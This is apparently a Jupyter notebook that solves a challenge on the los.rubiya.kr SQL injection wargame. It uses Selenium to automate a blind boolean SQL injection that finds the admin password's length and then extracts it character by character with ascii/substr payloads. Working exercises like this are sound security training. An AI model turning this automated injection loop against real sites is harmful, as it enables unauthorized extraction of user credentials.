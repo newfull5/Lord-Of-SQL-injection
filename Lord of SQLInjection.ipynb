{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "from selenium import webdriver\n",
    "from selenium.webdriver.common.keys import Keys\n",
    "import bs4\n",
    "from time import sleep"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [],
   "source": [
    "driver = webdriver.Chrome('C:\\웹 드라이버\\chromedriver.exe')\n",
    "driver.implicitly_wait(1)\n",
    "driver.get('https://los.rubiya.kr/')\n",
    "\n",
    "#login \n",
    "enter_page = driver.find_element_by_xpath('//*[@id=\"enter\"]')\n",
    "enter_page.click() \n",
    "\n",
    "sleep(1)\n",
    "\n",
    "usr = 'dhtocks'\n",
    "password = ''\n",
    "\n",
    "driver.execute_script(\"document.getElementsByName('id')[0].value=\\'\"+usr+\"\\'\")\n",
    "driver.execute_script(\"document.getElementsByName('pw')[0].value=\\'\"+password+\"\\'\")\n",
    "\n",
    "login_btn = driver.find_element_by_xpath('//*[@id=\"butt\"]/input[2]')\n",
    "login_btn.click()\n",
    "#login_end\n",
    "\n",
    "sleep(1)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 60,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[+] 비밀번호의 길이는8입니다 [+]\n"
     ]
    }
   ],
   "source": [
    "url = 'https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php'\n",
    "for i in range(1,30):\n",
    "    driver.get(url+\"?pw=' || id='admin' %26%26 length(pw) = {} %23\".format(i))\n",
    "    \n",
    "    html = driver.page_source\n",
    "    soup = bs4.BeautifulSoup(html, 'html.parser')\n",
    "    bod = soup.find('body')\n",
    "    bod = bod.text\n",
    "    \n",
    "    if \"Hello admin\" in bod:\n",
    "        print('[+] 비밀번호의 길이는'+str(i)+'입니다 [+]')\n",
    "        break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 83,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[+] 비밀번호는c입니다 [+]\n"
     ]
    }
   ],
   "source": [
    "for i in range(30,150):\n",
    "    driver.get(url+\"?pw=' || id='admin' %26%26 ascii(substr(pw,8,1))={} %23\".format(i))\n",
    "    \n",
    "    html = driver.page_source\n",
    "    soup = bs4.BeautifulSoup(html, 'html.parser')\n",
    "    bod = soup.find('body')\n",
    "    bod = bod.text\n",
    "    \n",
    "    if \"Hello admin\" in bod:\n",
    "        print('[+] 비밀번호는'+str(chr(i))+'입니다 [+]')\n",
    "        break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 85,
   "metadata": {},
   "outputs": [],
   "source": [
    "driver.get(url+\"?pw=' || id='admin' %26%26 pw='7b751aec' %23\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
